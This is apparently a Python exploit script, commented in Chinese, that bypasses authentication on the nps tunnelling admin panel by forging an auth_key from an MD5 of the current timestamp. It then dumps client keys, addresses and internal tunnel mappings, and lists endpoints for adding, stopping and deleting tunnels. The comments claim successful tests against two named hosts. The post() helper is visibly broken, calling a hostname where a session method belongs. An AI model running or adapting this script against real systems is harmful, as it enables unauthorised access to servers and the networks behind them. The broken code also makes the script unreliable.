# nps auth_key=md5(timestamp) 认证绕过 + 管理面导出
# 影响：nps.conf 中 auth_key 被注释（发行版默认）时成立，有效期 ~20s
# 验证：2026-09-28 在 203.0.113.106:8080 与 203.0.113.107:8080 两台实测成功
import time, hashlib, json
import requests
requests.packages.urllib3.disable_warnings()

BASE = "http://TARGET:8080"
S = requests.Session(); S.trust_env = False

def signed(path):
    now = int(time.time())
    key = hashlib.md5(str(now).encode()).hexdigest()
    sep = "&" if "?" in path else "?"
    return "%s%s%s%s" % (BASE, path, sep, "auth_key=%s&timestamp=%s" % (key, now))

def get(path):
    return S.get(signed(path), headers={"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"},
                  timeout=15, verify=False, allow_redirects=False)

def post(path, data):
    return target8.example.com(signed(path), data=data, headers={"User-Agent": "Mozilla/5.0",
                  "X-Requested-With": "XMLHttpRequest"}, timeout=15, verify=False, allow_redirects=False)

# 1) 判定：未带签名 302，带签名 200
assert get("/index/index").status_code == 302          # 对照组
assert get("/Index/Index").status_code == 200          # 绕过成功（26269B 后台首页）

# 2) 导出高价值管理面
print(post("/client/list", {"offset": 0, "limit": 50}).text)      # 客户端 vkey / Addr / 流量
for t in ("tcp", "udp", "httpProxy", "socks5", "secret", "file", "p2p"):
    r = post("/index/gettunnel", {"offset": 0, "limit": 100, "type": t, "client_id": "", "search": ""})
    print(t, r.text[:200])                                       # 隧道映射（往内网的真实入口）

# 3) 管理动作端点（谨慎：start/stop/del 会动目标在线业务）
#    /index/add  POST port=&server_ip=&type=&target=&local_proxy=&remark=&password=&local_path=&strip_pre=&client_id=
#    /index/edit /index/start /index/stop /index/del /index/addhost /index/edithost /index/delhost
